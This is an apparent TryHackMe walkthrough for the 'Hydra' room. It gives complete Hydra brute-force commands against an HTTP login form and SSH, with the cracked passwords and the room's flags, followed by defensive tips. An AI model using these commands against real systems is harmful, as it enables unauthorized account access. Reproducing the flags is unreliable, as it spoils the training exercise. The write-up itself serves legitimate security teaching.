# 🔱 THM — Hydra
### Offensive Security Tooling · Walkthrough

![TryHackMe](https://img.shields.io/badge/TryHackMe-Hydra-red?style=for-the-badge&logo=tryhackme&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Brute%20Force-orange?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Pwned%20✓-success?style=for-the-badge)

> *"Hydra is a fast and flexible online password cracking tool. It supports numerous protocols including SSH, FTP, HTTP, HTTPS, SMB, and more."*

---

## 📋 Table of Contents

- [Room Overview](#-room-overview)
- [Tools & Environment](#-tools--environment)
- [Task 1 — Hydra Introduction](#-task-1--hydra-introduction)
- [Task 2 — Brute Force Web Login (Flag 1)](#-task-2--brute-force-web-login-flag-1)
- [Task 3 — Brute Force SSH (Flag 2)](#-task-3--brute-force-ssh-flag-2)
- [Flags Summary](#-flags-summary)
- [Key Takeaways](#-key-takeaways)

---

## 🗺 Room Overview

| Field | Details |
|-------|---------|
| 🔗 Room | [tryhackme.com/room/hydra](https://tryhackme.com/room/hydra) |
| 🎯 Objective | Use Hydra to brute-force web form and SSH credentials |
| 👤 Target User | `molly` |
| 📋 Wordlist | `/usr/share/wordlists/rockyou.txt` |
| 🚩 Flags | 2 |

---

## 🛠 Tools & Environment

```
OS       : Kali Linux (AttackBox or in-browser Kali)
Tool     : THC-Hydra (pre-installed on Kali)
Wordlist : /usr/share/wordlists/rockyou.txt
Browser  : Firefox (DevTools for request inspection)
Protocol : HTTP POST · SSH
```

> 💡 **Hydra is pre-installed on Kali Linux and TryHackMe's AttackBox.**
> No setup needed — just deploy the machine and go.

---

## 📖 Task 1 — Hydra Introduction

Hydra is a **parallelized login cracker** that supports dozens of protocols out of the box.
It works by cycling through a wordlist and testing each password against a target service.

### Core Syntax

```bash
hydra -l <username> -P <wordlist> <target> <protocol>
```

### Common Flags

| Flag | Meaning |
|------|---------|
| `-l` | Single username (lowercase L) |
| `-L` | Username list (file) |
| `-p` | Single password |
| `-P` | Password list (file) |
| `-t` | Number of parallel threads (default: 16) |
| `-V` | Verbose — show every attempt |
| `-f` | Stop after first valid credential found |
| `-s` | Custom port |

---

## 🌐 Task 2 — Brute Force Web Login (Flag 1)

### Step 1 — Open the target in a browser

Navigate to `http://<MACHINE_IP>/login` and you'll see a login form.

```
http://10.10.x.x/login
```

### Step 2 — Capture the POST request with DevTools

Open **Developer Tools → Network tab** (`F12`), enter any wrong credentials and submit.
Inspect the captured POST request:

```
POST /login
Body: username=test&password=test
```

Note the **failure message** returned by the page:

```
Your username or password is incorrect.
```

> ⚠️ This exact string is critical — Hydra uses it to detect *failed* attempts.

### Step 3 — Build the Hydra command

The `http-post-form` module takes three colon-separated fields:

```
"<path>:<POST body>:<failure string>"
```

Putting it all together:

```bash
hydra -l molly \
      -P /usr/share/wordlists/rockyou.txt \
      <MACHINE_IP> \
      http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." \
      -V -t 4
```

| Part | Meaning |
|------|---------|
| `-l molly` | Target username |
| `-P rockyou.txt` | Password wordlist |
| `/login` | Login endpoint path |
| `^USER^` | Hydra placeholder for username |
| `^PASS^` | Hydra placeholder for password |
| `F=Your username or password is incorrect.` | Failure string — marks a bad attempt |
| `-V` | Verbose output |
| `-t 4` | 4 parallel threads |

### Step 4 — Run & get the password

```
[DATA] attacking http-post-form://10.10.x.x:80/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.
[ATTEMPT] target 10.10.x.x - login "molly" - pass "123456"
[ATTEMPT] target 10.10.x.x - login "molly" - pass "password"
...
[80][http-post-form] host: 10.10.x.x   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
```

> ✅ **Credentials found:** `molly : sunshine`

### Step 5 — Login and grab the flag

Log in at `http://<MACHINE_IP>/login` with:

```
Username: molly
Password: sunshine
```

The page displays **Flag 1**:

```
🚩 Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}
```

---

## 🔐 Task 3 — Brute Force SSH (Flag 2)

### Step 1 — Build the SSH Hydra command

SSH brute-forcing with Hydra is much simpler — no form fields to map:

```bash
hydra -l molly \
      -P /usr/share/wordlists/rockyou.txt \
      <MACHINE_IP> \
      ssh \
      -t 4
```

### Step 2 — Run & get the password

```
[DATA] attacking ssh://10.10.x.x:22/
[ATTEMPT] target 10.10.x.x - login "molly" - pass "123456"
[ATTEMPT] target 10.10.x.x - login "molly" - pass "password"
...
[22][ssh] host: 10.10.x.x   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
```

> ✅ **Credentials found:** `molly : butterfly`

### Step 3 — SSH into the machine

```bash
ssh molly@<MACHINE_IP>
# Enter password: butterfly
```

```
molly@ip-10-10-x-x:~$ ls
flag2.txt

molly@ip-10-10-x-x:~$ cat flag2.txt
```

```
🚩 Flag 2: THM{c8eeb0468febbadea859baeb33b2541b}
```

---

## 🚩 Flags Summary

| # | Task | Credential Found | Flag |
|---|------|-----------------|------|
| 1 | Web Login (HTTP POST) | `molly : sunshine` | `THM{2673a7dd116de68e85c48ec0b1f2612e}` |
| 2 | SSH Brute Force | `molly : butterfly` | `THM{c8eeb0468febbadea859baeb33b2541b}` |

---

## 💡 Key Takeaways

```
✦  Hydra can attack HTTP forms, SSH, FTP, SMB, RDP, and many more protocols
✦  Always capture the exact failure message from the target app — Hydra needs it
✦  Use -t 4 on THM rooms to avoid overwhelming/rate-limiting the machine
✦  rockyou.txt is the go-to wordlist — it contains ~14 million common passwords
✦  "sunshine" and "butterfly" are both in the top ~10,000 most common passwords
✦  Strong, unique passwords would have made this attack impossible
```

### 🛡️ Defensive Recommendations

| Vulnerability | Mitigation |
|--------------|-----------|
| Weak password (`sunshine`) | Enforce strong password policy (12+ chars, mixed) |
| No rate limiting on login | Implement account lockout / CAPTCHA |
| SSH with password auth | Disable passwords, use SSH key pairs only |
| No 2FA | Add multi-factor authentication |

---

## ⚠️ Disclaimer

> This walkthrough is for **educational purposes only**.
> Only perform brute-force attacks on systems you own or have **explicit written permission** to test.
> Unauthorized access is illegal under the Computer Misuse Act and equivalent laws worldwide.

---

<div align="center">

*Room completed ✓ · [TryHackMe Profile](https://tryhackme.com/p/h4cker_one)*

</div>
